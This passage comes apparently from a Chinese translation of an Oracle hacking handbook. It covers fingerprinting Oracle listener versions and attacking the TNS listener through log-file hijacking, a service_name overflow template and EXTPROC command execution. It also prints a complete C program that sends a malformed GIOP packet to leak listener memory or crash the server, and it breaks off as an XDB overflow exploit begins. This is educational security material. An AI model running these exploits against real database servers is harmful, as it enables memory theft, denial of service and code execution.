class="line">lsnrctl</span><br><span class="line">set current_listener 127.0.0.1[可换成远程ip]</span><br><span class="line">version</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/5.png"></p><p>​        从前面的输出中，可以看到服务器正在Windows上运行11.2.0.1.0。</p><h4 id="利用TNS协议版本"><a href="#利用TNS协议版本" class="headerlink" title="利用TNS协议版本"></a>利用TNS协议版本</h4><p>​        在TNS连接数据包中，在数据包中找到9个字节的WORD（大小为2个字节）指定了所使用的TNS协议版本。下一个WORD（字节11和12）指定发送系统可以理解的最早的版本号。</p><p>​        例如，如果运行版本8.1.7.4的Oracle客户端连接到Oracle服务器上的侦听器，则客户端发送0x0136作为正在使用的TNS协议版本，并发送0x012C作为它理解的最早版本。这样，两个不同版本的Oracle可以通过选择他们都理解的TNS版本进行通信。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Oracle 10r2支持0x139</span><br><span class="line">Oracle 9r2支持0x138</span><br><span class="line">Oracle 9i支持0x137</span><br><span class="line">Oracle 8支持0x136。</span><br></pre></td></tr></table></figure><h4 id="利用XML数据库版本"><a href="#利用XML数据库版本" class="headerlink" title="利用XML数据库版本"></a>利用XML数据库版本</h4><p>​    如果XML数据库正在运行，则可以远程登录到TCP端口2100以获取版本信息。 此服务是ftp服务，显示信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">220 PILUM FTP Server (Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production) ready.</span><br></pre></td></tr></table></figure><p>​        同样，TCP端口8080上的XDB Web服务器也显示版本号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: PILUM</span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">DAV: 1,2,&lt;http://www.oracle.com/xdb/webdav/props&gt;</span><br><span class="line">Server: Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 -</span><br><span class="line">Production</span><br><span class="line"></span><br><span class="line">WWW-Authenticate: Basic Realm=&quot; XDB&quot;</span><br><span class="line">Date: Mon, 19 Jun 2006 18:57:59 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 147</span><br></pre></td></tr></table></figure><h4 id="利用TNS报错信息"><a href="#利用TNS报错信息" class="headerlink" title="利用TNS报错信息"></a>利用TNS报错信息</h4><p>​        如果侦听器收到它不理解的TNS命令，则会将错误发送回去。 此错误文本包含一个VSNNUM，该VSNNUM包含一个十进制数字，例如169869568。如果我们将此数字转换为十六进制，请查看得到的内容：0x0A200100。 这是伪装的Oracle版本号-在本例中为10.2.0.1.0。 以下shell程序转储来自于不理解“unbreakable”命令的侦听器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 181</span><br><span class="line">      Identifier: 13914</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x41e5</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.59</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 3004</span><br><span class="line">      Sequence: 1152664576</span><br><span class="line">      ack: 2478634793</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 17451</span><br><span class="line">      Checksum: 0xcae1</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 8d 00 00 04 00 00 00 22 00 00 81 28 44 45 53          &quot;   (DES</span><br><span class="line">      43 52 49 50 54 49 4f 4e 3d 28 45 52 52 3d 31 31  CRIPTION=(ERR=11</span><br><span class="line">      35 33 29 28 56 53 4e 4e 55 4d 3d 31 36 39 38 36  53)(VSNNUM=16986</span><br><span class="line">      39 35 36 38 29 28 45 52 52 4f 52 5f 53 54 41 43  9568)(ERROR_STAC</span><br><span class="line">      4b 3d 28 45 52 52 4f 52 3d 28 43 4f 44 45 3d 31  K=(ERROR=(CODE=1</span><br><span class="line">      31 35 33 29 28 45 4d 46 49 3d 34 29 28 41 52 47  153)(EMFI=4)(ARG</span><br><span class="line">      53 3d 27 75 6e 62 72 65 61 6b 61 62 6c 65 27 29  S=&#x27;unbreakable&#x27;)</span><br><span class="line">      29 28 45 52 52 4f 52 3d 28 43 4f 44 45 3d 33 30  )(ERROR=(CODE=30</span><br><span class="line">      33 29 28 45 4d 46 49 3d 31 29 29 29 29           3)(EMFI=1))))</span><br></pre></td></tr></table></figure><h4 id="利用TNS的TTC功能"><a href="#利用TNS的TTC功能" class="headerlink" title="利用TNS的TTC功能"></a>利用TNS的TTC功能</h4><p>​        我们之前讨论了TTC功能，并提到了版本功能0x3B。 这将导致Oracle服务器在认证之前显示其版本。</p><p>​        <strong>使用其他网络选项协商</strong></p><p>​        客户端从服务器接收到“接受”数据包后，客户端可以选择协商其他网络服务，例如身份验证，加密，数据完整性和管理程序。 可以在ANO协商标头（0xDEADBEEF）后三个字节找到客户端或服务器的版本-数据包中的17个字节。 在以下数据中，可以看到版本为8.1.7.4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 203</span><br><span class="line">      Identifier: 14473</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x3fa0</span><br><span class="line">      Source IP: 192.168.0.59</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 4194</span><br><span class="line">      Dest port: 1495</span><br><span class="line">      Sequence: 422372252</span><br><span class="line">      ack: 597087647</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 65087</span><br><span class="line">      Checksum: 0x7e36</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 a3 00 00 06 00 00 00 00 00 de ad be ef 00 99</span><br><span class="line">      08 10 74 00 00 04 00 00 04 00 03 00 00 00 00 00    t</span><br><span class="line">      04 00 05 08 10 74 00 00 02 00 06 00 1f 00 0e 00       t</span><br><span class="line">      01 de ad be ef 00 03 00 00 00 02 00 04 00 01 00</span><br><span class="line">      01 00 07 00 00 00 00 00 04 00 05 08 10 74 00 00              t</span><br><span class="line">      02 00 06 fa ff 00 01 00 02 01 00 03 00 00 4e 54               NT</span><br><span class="line">      53 00 04 00 05 02 00 00 00 00 04 00 04 00 00 00  S</span><br><span class="line">      00 00 04 00 04 00 00 00 02 00 02 00 02 00 00 00</span><br><span class="line">      00 00 04 00 05 08 10 74 00 00 01 00 02 00 00 03        t</span><br><span class="line">      00 02 00 00 00 00 00 04 00 05 08 10 74 00 00 01             t</span><br><span class="line">      00 02 00</span><br></pre></td></tr></table></figure><h2 id="攻击TNS侦听器和调度程序"><a href="#攻击TNS侦听器和调度程序" class="headerlink" title="攻击TNS侦听器和调度程序"></a>攻击TNS侦听器和调度程序</h2><p>​        TNS侦听器是所有Oracle通信的枢纽。</p><h3 id="TNS劫持攻击"><a href="#TNS劫持攻击" class="headerlink" title="TNS劫持攻击"></a>TNS劫持攻击</h3><p>​        10g之前的TNS侦听器可以直接进行远程管理，而无需提供密码。 由于可以指定日志文件和跟踪文件的位置，因此攻击者可以将日志文件设置为例如Windows管理员启动文件夹中的批处理文件或Oracle用户主目录中的.rhosts文件。Linux上的目录。 设置好之后，攻击者可以发送命令运行，或者在Linux上发送“ + +”命令，使这些命令执行，或者能够使用r *服务以Oracle用户身份运行命令。 </p><p>​        除了能够设置密码来管理侦听器外，Oracle还向侦听器添加了另一个选项-ADMIN_RESTRICTIONS。 启用后，某些命令（例如更改日志文件的位置）只能在本地执行。 有关详细信息，请访问<a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html%E3%80%82">www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html。</a></p><p>​        除此之外，TNS侦听器还遭受许多缓冲区溢出漏洞的困扰。 例如，在2002年6月，Oracle解决了9i中的一个溢出问题，该溢出中过长的service_name参数将触发该问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(DESCRIPTION=(ADDRESS=</span><br><span class="line">(PROTOCOL=TCP)(HOST=192.168.0.65)</span><br><span class="line">(PORT=1521))(CONNECT_DATA=</span><br><span class="line">(SERVICE_NAME=shellcode_goes_here) </span><br><span class="line">(CID=</span><br><span class="line">(PROGRAM=SQLPLUS.EXE)</span><br><span class="line">(HOST=foo)(USER=bar))))</span><br></pre></td></tr></table></figure><p>​        发生错误是因为在将错误写入日志文件时，用户提供的service_name被复制到基于堆栈的缓冲区中。 攻击者可能利用此漏洞来控制流程的执行路径。</p><p>​        可以在没有用户ID和密码的情况下针对TNS侦听器发动的另一种攻击，将诱使服务器加载任意库并执行任意功能。对于Oracle 8.1.7.4，它仍未打补丁，尽管存在严重的安全隐患，Oracle仍拒绝对其进行修复。攻击方法包括连接到侦听器并请求访问EXTPROC，EXTPROC是用于运行PLSQL外部过程的程序。因为没有身份验证，并且因为可以通过TCP到达EXTPROC，所以可以加载例如msvcrt.dll或libc，并执行system（）函数和任意操作系统命令。对于Oracle 9和更高版本，Oracle制作了一个补丁程序，但该补丁程序存在缓冲区溢出漏洞。该补丁添加了代码，以捕获攻击者尝试远程加载库然后进行记录的记录，但是记录代码使用了sprintf（）。通过提供一个过长的库名，基于堆栈的缓冲区可能会溢出，从而使攻击者获得控制权。第二个补丁不是很好。通过将环境变量嵌入库名称中，可以通过长度检查。此后，环境变量将被扩展，从而推出了用户提供的字符串的长度。同样，可能会使缓冲区溢出。</p><h3 id="攻击-GIOP服务器"><a href="#攻击-GIOP服务器" class="headerlink" title="攻击 GIOP服务器"></a>攻击 GIOP服务器</h3><p>​        默认情况下，Oracle 9.0.1和Oracle 8.1.7.4都安装了IIOP（Internet内部对象请求代理协议）服务器以启用对CORBA应用程序的访问。 IIOP是GIOP（公用对象请求代理协议）的实现。该服务器中的漏洞可能允许攻击者通过网络从服务器中转储任意内存或使服务器崩溃。 </p><p>​        GIOP数据包的标头有一个size，它指示客户端正在发送多少数据。服务器使用此大小参数来构建其响应。如果客户端发送的大小大于其实际发送的数据，则服务器将读取内存中的数据，直到攻击者指定的大小为止。这样，攻击者就可以开始泄漏TNS侦听器的内存内容。如果大小足够大，则侦听器最终会尝试读取未初始化的内存，并且访问会导致拒绝服务。以下代码演示了这一点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winsock.h&gt;</span><br><span class="line"></span><br><span class="line">int SendGIOPPacket(void);</span><br><span class="line">int StartWinsock(void);</span><br><span class="line">int packet_length(char *);</span><br><span class="line">int PrintResponse(unsigned char *p, int 1);</span><br><span class="line">int bswap_i(unsigned int);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct sockaddr_in s_sa;</span><br><span class="line">struct hostent *he;</span><br><span class="line">unsigned int addr;</span><br><span class="line">int IIOPPort=2481;</span><br><span class="line">char host[260]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">int PKT_LEN = 148;</span><br><span class="line"></span><br><span class="line">unsigned char GIOPPacketHeader[2000]=</span><br><span class="line">&quot;\x47\x49\x4f\x50&quot;      // MAGIC</span><br><span class="line">&quot;\x01\x00&quot;            // VERSION</span><br><span class="line">&quot;\x00&quot;                  // BYTE ORDER</span><br><span class="line">&quot;\x00&quot;                  // MSG_TYPE</span><br><span class="line">&quot;\x00\x00\x00\x82&quot;      // MSG_SIZE</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\xFF\xFF&quot;;      // SIZE</span><br><span class="line"></span><br><span class="line">unsigned char GIOPPacketTail[]=</span><br><span class="line">&quot;\x00&quot;</span><br><span class="line">&quot;\x49\x4e\x49\x54&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x04&quot;</span><br><span class="line">&quot;\x67\x65\x74\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x0c&quot;</span><br><span class="line">&quot;\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65\x00&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      unsigned int ErrorLevel=0, bytes = 0;</span><br><span class="line">      unsigned short len=0;</span><br><span class="line">      int count = 0;</span><br><span class="line">      unsigned char sid[100]=&quot;&quot;;</span><br><span class="line">      unsigned char buffer[512]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if(argc !=4)</span><br><span class="line">            return printf(&quot;%s HOST SID BYTES\n&quot;,argv[0]);</span><br><span class="line"></span><br><span class="line">      strncpy(host,argv[1],256);</span><br><span class="line">      strncpy(sid,argv[2],96);</span><br><span class="line">      bytes = atoi(argv[3]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_snprintf(buffer,508,&quot;ORCL(CONNECT_DATA=(REP_ID=IDL:CORBA/InitialReferen</span><br><span class="line">ces:1.0)(SID=%s)(SESSION_ID=0))&quot;,sid);</span><br><span class="line"></span><br><span class="line">      len = (unsigned short)strlen(sid)+0x82;</span><br><span class="line">      PKT_LEN = len + 0xC;</span><br><span class="line"></span><br><span class="line">      bytes = bswap_i(bytes);</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[24],&amp;bytes,4);</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[28],buffer,strlen(buffer));</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[28+strlen(buffer)],GIOPPacketTail,35);</span><br><span class="line"></span><br><span class="line">      GIOPPacketHeader[11]=(unsigned char)len;</span><br><span class="line">      len = len &lt;&lt; 8;</span><br><span class="line">      GIOPPacketHeader[10]=(unsigned char)len;</span><br><span class="line"></span><br><span class="line">      if(StartWinsock()==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Error starting Winsock.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      SendGIOPPacket();</span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int bswap_i(unsigned int v)</span><br><span class="line">&#123;</span><br><span class="line">      __asm &#123;</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov eax,v</span><br><span class="line">            bswap eax</span><br><span class="line">            mov v, eax</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      return v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int StartWinsock()</span><br><span class="line">&#123;</span><br><span class="line">      int err=0;</span><br><span class="line">      WORD wVersionRequested;</span><br><span class="line">      WSADATA wsaData;</span><br><span class="line"></span><br><span class="line">      wVersionRequested = MAKEWORD( 2, 0 );</span><br><span class="line">      err = WSAStartup(wVersionRequested, &amp;wsaData );</span><br><span class="line">      if ( err != 0 )</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE(wsaData.wVersion )</span><br><span class="line">!= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">            WSACleanup( );</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (isalpha(host[0]))</span><br><span class="line">            he = gethostbyname(host);</span><br><span class="line"></span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            addr = inet_addr(host);</span><br><span class="line">            he = gethostbyaddr((char *)&amp;addr,4,AF_INET);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (he == NULL)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      s_sa.sin_addr.s_addr=INADDR_ANY;</span><br><span class="line">      s_sa.sin_family=AF_INET;</span><br><span class="line">      memcpy(&amp;s_sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int SendGIOPPacket(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      SOCKET c_sock;</span><br><span class="line"></span><br><span class="line">      unsigned char resp[10000]=&quot;&quot;;</span><br><span class="line">      int snd=0,rcv=0,count=0, var=0;</span><br><span class="line">      unsigned int ttlbytes=0;</span><br><span class="line">      unsigned int to=2000;</span><br><span class="line">      struct sockaddr_in        srv_addr,cli_addr;</span><br><span class="line">      SOCKET            cli_sock;</span><br><span class="line">      unsigned int size = 0;</span><br><span class="line">      char *buf = NULL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      cli_sock=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">      if (cli_sock==INVALID_SOCKET)</span><br><span class="line">            return printf(&quot;sock error&quot;);</span><br><span class="line"></span><br><span class="line">      s_sa.sin_port=htons((unsigned short)IIOPPort);</span><br><span class="line"></span><br><span class="line">      if</span><br><span class="line">(connect(cli_sock,(LPSOCKADDR)&amp;s_sa,sizeof(s_sa))==SOCKET_ERROR)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Connect error %d&quot;,GetLastError());</span><br><span class="line">            return closesocket(cli_sock);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      buf = malloc(264);</span><br><span class="line">      if(!buf)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;malloc failed.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      memset(buf,0,264);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      snd=send(cli_sock, GIOPPacketHeader , PKT_LEN , 0);</span><br><span class="line">      while(rcv !=SOCKET_ERROR)</span><br><span class="line">      &#123;</span><br><span class="line">            rcv = recv(cli_sock,resp,260,0);</span><br><span class="line">            if(rcv == 0||rcv ==SOCKET_ERROR)</span><br><span class="line">                  break;</span><br><span class="line"></span><br><span class="line">            memmove(&amp;buf[size],resp,rcv);</span><br><span class="line">            size = size + rcv;</span><br><span class="line">            buf = realloc(buf,size+260);</span><br><span class="line">            if(!buf)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;realloc failed.\n&quot;);</span><br><span class="line">                  closesocket(cli_sock);</span><br><span class="line">                  return 0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      PrintResponse(buf,size);</span><br><span class="line">      closesocket(cli_sock);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int PrintResponse(unsigned char *ptr,int size)</span><br><span class="line">&#123;</span><br><span class="line">      int count = 0;</span><br><span class="line">      int chk = 0;</span><br><span class="line">      int sp = 0;</span><br><span class="line">      printf(&quot;%.4X   &quot;,count);</span><br><span class="line">      while(count &lt; size)</span><br><span class="line">      &#123;</span><br><span class="line">            if(count % 16 == 0 &amp;&amp; count &gt; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;   &quot;);</span><br><span class="line">                  chk = count;</span><br><span class="line">                  count = count - 16;</span><br><span class="line">                  while(count &lt; chk)</span><br><span class="line">                  &#123;</span><br><span class="line">                        if(ptr[count]&lt;0x20)</span><br><span class="line">                              printf(&quot;.&quot;);</span><br><span class="line">                        else</span><br><span class="line">                              printf(&quot;%c&quot;,ptr[count]);</span><br><span class="line">                        count ++;</span><br><span class="line">                  &#125;</span><br><span class="line">                  printf(&quot;\n%.4X   &quot;,count);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%.2X &quot;,ptr[count]);</span><br><span class="line">            count ++;</span><br><span class="line">      &#125;</span><br><span class="line">      count = count - chk;</span><br><span class="line">      count = 17 - count;</span><br><span class="line">      while(sp &lt; count)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;    &quot;);</span><br><span class="line">            sp++;</span><br><span class="line">      &#125;</span><br><span class="line">      count = chk;</span><br><span class="line">      while(count &lt; size)</span><br><span class="line">      &#123;</span><br><span class="line">            if(ptr[count]&lt;0x20)</span><br><span class="line">                  printf(&quot;.&quot;);</span><br><span class="line">            else</span><br><span class="line">                  printf(&quot;%c&quot;,ptr[count]);</span><br><span class="line">            count ++;</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;\n\n\n\n&quot;);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="XML数据库"><a href="#XML数据库" class="headerlink" title="XML数据库"></a>XML数据库</h3><p>​        XML数据库（也称为XDB）提供两种服务：一种在TCP端口8080上通过HTTP提供服务，另一种在TCP端口2100上基于FTP的服务。过去，XDB遭受了许多缓冲区溢出漏洞的困扰，包括身份验证机制中的溢出（用户名或密码过长）。 以下代码利用了在Linux上运行的XDB 9.2.0.1上的UNLOCK溢出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 